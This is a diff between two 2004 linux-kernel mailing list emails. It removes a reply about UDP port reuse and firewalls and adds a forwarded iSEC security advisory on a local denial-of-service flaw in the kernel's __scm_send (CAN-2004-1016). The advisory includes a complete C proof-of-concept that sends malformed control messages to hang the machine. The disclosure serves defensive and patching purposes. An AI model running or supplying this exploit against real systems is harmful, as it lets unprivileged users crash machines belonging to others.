@@ -1,85 +1,228 @@
-Return-Path: <linux-kernel-owner+willy=40w.ods.org-S261562AbULNRLQ@vger.kernel.org>
+Return-Path: <linux-kernel-owner+willy=40w.ods.org-S261568AbULNROc@vger.kernel.org>
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-	id S261562AbULNRLQ (ORCPT <rfc822;willy@w.ods.org>);
-	Tue, 14 Dec 2004 12:11:16 -0500
-Received: (majordomo@vger.kernel.org) by vger.kernel.org id S261564AbULNRLP
+	id S261568AbULNROc (ORCPT <rfc822;willy@w.ods.org>);
+	Tue, 14 Dec 2004 12:14:32 -0500
+Received: (majordomo@vger.kernel.org) by vger.kernel.org id S261561AbULNRM5
 	(ORCPT <rfc822;linux-kernel-outgoing>);
-	Tue, 14 Dec 2004 12:11:15 -0500
-Received: from linux01.gwdg.de ([134.76.13.21]:21651 "EHLO linux01.gwdg.de")
-	by vger.kernel.org with ESMTP id S261562AbULNRKm (ORCPT
+	Tue, 14 Dec 2004 12:12:57 -0500
+Received: from smtp.dei.uc.pt ([193.137.203.228]:5837 "EHLO smtp.dei.uc.pt")
+	by vger.kernel.org with ESMTP id S261564AbULNRLY (ORCPT
 	<rfc822;linux-kernel@vger.kernel.org>);
-	Tue, 14 Dec 2004 12:10:42 -0500
-Date: Tue, 14 Dec 2004 18:10:35 +0100 (MET)
-From: Jan Engelhardt <jengelh@linux01.gwdg.de>
-To: Adam Denenberg <adam@dberg.org>
-cc: linux-kernel@vger.kernel.org
-Subject: Re: bind() udp behavior 2.6.8.1
-In-Reply-To: <1103043716.10965.40.camel@sucka>
-Message-ID: <Pine.LNX.4.61.0412141806440.5600@yvahk01.tjqt.qr>
-References: <1103038728.10965.12.camel@sucka>  <Pine.LNX.4.61.0412141700430.24308@yvahk01.tjqt.qr>
-  <1103042538.10965.27.camel@sucka>  <Pine.LNX.4.61.0412141742590.22148@yvahk01.tjqt.qr>
- <1103043716.10965.40.camel@sucka>
+	Tue, 14 Dec 2004 12:11:24 -0500
+Date: Tue, 14 Dec 2004 17:10:56 +0000 (WET)
+From: "Marcos D. Marado Torres" <marado@student.dei.uc.pt>
+To: linux-kernel@vger.kernel.org
+Subject: Linux kernel scm_send local DoS (fwd)
+Message-ID: <Pine.LNX.4.61.0412141710250.25679@student.dei.uc.pt>
 MIME-Version: 1.0
-Content-Type: TEXT/PLAIN; charset=US-ASCII
+Content-Type: TEXT/PLAIN; charset=US-ASCII; format=flowed
+X-UC-FCTUC-DEI-MailScanner-Information: Please contact helpdesk@dei.uc.pt for more information
+X-UC-FCTUC-DEI-MailScanner: Found to be clean
+X-MailScanner-From: marado@student.dei.uc.pt
 Sender: linux-kernel-owner@vger.kernel.org
 X-Mailing-List: linux-kernel@vger.kernel.org
 
->any firewall must keep some sort of state table even if it is udp.  How
-
-No.
-
->else do you manage established connections?  It must know that some high
-
-You don't manage something that does not need managing. It's like firing a 
-bullet at some. You can not tell whether there's still more bullets to come or 
-not.
-
->numbered port is making a udp dns request, and thus be able to allow
->that request back thru to the high numbered port client b/c the
->connection is already established.
-
-See linux-os's reply. UDP is connectionless.
-
->what does any fireawall do if it sees one ip with the same high numbered
->udp port make a request in a _very_ short amount of time (under 60ms for
->this example)?
-
-I let it pass.
-
->It must make a distintion between an attack and legit
->traffic.
-
-That's something VERY different. There is a difference between **knowing** 
-that a set of packets _are related_ to each other and the time between two 
-**arbitrary** packets.
-
->  So if it sees one ip/port make multiple requests in too short
->of a time frame, it will drop the traffic, as it probably should.
-
-Depends on the definition of attack. Look it at that way:
-
-localhost:32768 sends an UDP packet to dnsserver:53... but already the next 
-packet CAN BE malicious. (Another process can take over the port if the former 
-has dropped the socket.)
-
->This
->is causing erratic behavior when traffic traverses the firewall b/c the
-
-Then fix the FW.
-
->linux kernel keeps allocating the same source high numbered ephemeral
-
-In your case, the socket is allocated once for the whole program. This socket 
-is _reused_.
-
->port.  I would like to know if there is a way to alter this behavior b/c
->it is breaking applications.
-
-No, as said, your FW is broken.
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
 
 
+...and it seems that that's not only one but two...
+
+- -- 
+/* *************************************************************** */
+    Marcos Daniel Marado Torres	     AKA	Mind Booster Noori
+    http://student.dei.uc.pt/~marado   -	  marado@student.dei.uc.pt
+    () Join the ASCII ribbon campaign against html email, Microsoft
+    /\ attachments and Software patents.   They endanger the World.
+    Sign a petition against patents:  http://petition.eurolinux.org
+/* *************************************************************** */
+
+- ---------- Forwarded message ----------
+Date: Tue, 14 Dec 2004 11:32:57 +0100 (CET)
+From: Paul Starzetz <ihaquer@isec.pl>
+Reply-To: security@isec.pl
+To: bugtraq@securityfocus.com, vulnwatch@vulnwatch.org,
+     full-disclosure@lists.netsys.com
+Subject: Linux kernel scm_send local DoS
 
 
-Jan Engelhardt
--- 
-ENOSPC
+Synopsis:  Linux kernel scm_send local DoS
+Product:   Linux kernel
+Version:   2.4 up to and including 2.4.28, 2.6 up to and including 2.6.9
+Vendor:    http://www.kernel.org/
+URL:       http://isec.pl/vulnerabilities/isec-0019-scm.txt
+CVE:       CAN-2004-1016
+Author:    Paul Starzetz <ihaquer@isec.pl>
+Date:      Dec 14, 2004
+
+
+Issue:
+======
+
+A  locally  exploitable  flaw  has been found in the Linux socket layer,
+that allows a local user to hang a vulnerable machine.
+
+
+Details:
+========
+
+The Linux kernel provides a powerful socket API  to  user  applications.
+Among other functions sockets provide an universal way for IPC and user-
+kernel communication. The socket layer uses several  logical  sublayers.
+One  of  the  layers,  so called auxiliary message layer (or scm layer),
+augments the socket API by  an  universal  user-kernel  message  passing
+capability (see recvfrom(2) for more details on auxiliary messages).
+
+One  of  the  scm  message  parsing  functions  invoked  from the kernel
+sendmsg() code is __scm_send() and suffers from a deadlock condition  if
+carefully  prepared  auxiliary  message(s)  is  sent  to  a socket by an
+unprivileged application.
+
+We believe that the 2.4 kernel branch is not  further  exploitable.  The
+2.6  branch  has not been extensively checked, however it may be locally
+exploitable to gain elevated privileges due to its increased complexity.
+
+
+Discussion:
+=============
+
+See attached code.
+
+
+Impact:
+=======
+
+Unprivileged local users may hang a vulnerable Linux machine.
+
+
+Credits:
+========
+
+Paul  Starzetz  <ihaquer@isec.pl>  has  identified the vulnerability and
+performed further research. COPYING, DISTRIBUTION, AND  MODIFICATION  OF
+INFORMATION  PRESENTED  HERE  IS ALLOWED ONLY WITH EXPRESS PERMISSION OF
+ONE OF THE AUTHORS.
+
+
+Disclaimer:
+===========
+
+This document and all the information it contains are provided "as  is",
+for  educational  purposes  only,  without warranty of any kind, whether
+express or implied.
+
+The authors reserve the right not to be responsible for the  topicality,
+correctness,  completeness  or  quality  of the information  provided in
+this document. Liability claims regarding damage caused by  the  use  of
+any  information  provided,  including  any kind of information which is
+incomplete or incorrect, will therefore be rejected.
+
+
+Appendix:
+=========
+
+/*
+  *	Linux kernel 2.4 & 2.6 __scm_send DoS
+  *	Warning! this code will hang your machine
+  *
+  *      gcc -O2 scmbang.c -o scmbang
+  *
+  *      Copyright (c) 2004  iSEC Security Research. All Rights Reserved.
+  *
+  *      THIS PROGRAM IS FOR EDUCATIONAL PURPOSES *ONLY* IT IS PROVIDED "AS IS"
+  *      AND WITHOUT ANY WARRANTY. COPYING, PRINTING, DISTRIBUTION, MODIFICATION
+  *      WITHOUT PERMISSION OF THE AUTHOR IS STRICTLY PROHIBITED.
+  *
+  */
+
+
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <errno.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+
+
+
+static char buf[1024];
+
+
+
+void
+fatal (const char *msg)
+{
+     printf ("\n");
+     if (!errno)
+       {
+ 	  fprintf (stderr, "FATAL: %s\n", msg);
+       }
+     else
+       {
+ 	  perror (msg);
+       }
+     printf ("\n");
+     fflush (stdout);
+     fflush (stderr);
+     exit (1);
+}
+
+
+int
+main (void)
+{
+     int s[2], r;
+     struct sockaddr_in sin;
+     struct msghdr *msg;
+     struct cmsghdr *cmsg;
+
+     r = socketpair (AF_UNIX, SOCK_DGRAM, 0, s);
+     if (r < 0)
+ 	fatal ("socketpair");
+
+     memset (buf, 0, sizeof (buf));
+     msg = (void *) buf;
+     msg->msg_control = (void *) (msg + 1);
+
+// make bad cmsgs
+     cmsg = (void *) msg->msg_control;
+
+     cmsg->cmsg_len = sizeof (*cmsg);
+     cmsg->cmsg_level = 0xdeadbebe;
+     cmsg->cmsg_type = 12;	// len after overflow on second msg
+     cmsg++;
+
+// -12 for deadlock
+     cmsg->cmsg_len = -12;
+     cmsg->cmsg_level = SOL_IP;
+     msg->msg_controllen = (unsigned) (cmsg + 1) - (unsigned) msg->msg_control;
+     r = sendmsg (s[0], msg, 0);
+     if (r < 0)
+ 	fatal ("sendmsg");
+
+     printf ("\nYou lucky\n");
+     fflush (stdout);
+
+     return 0;
+}
+
+- --
+Paul Starzetz
+iSEC Security Research
+http://isec.pl/
+
+
+- ------------ Output from gpg ------------
+gpg: WARNING: using insecure memory!
+gpg: please see http://www.gnupg.org/faq.html for more information
+gpg: Signature made Tue 14 Dec 2004 10:33:02 AM WET using DSA key ID 9E70A6EE
+gpg: Can't check signature: public key not found
+
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.2.1 (GNU/Linux)
+Comment: Made with pgp4pine 1.76
+
+iD8DBQFBvx6imNlq8m+oD34RAu36AJ9S/vh/QIvMDwy+J/vYD1ArZuOvMACgnLsS
+ShwvHjuPyHBlHuK2WFaA0TU=
+=g+Yc
+-----END PGP SIGNATURE-----
+
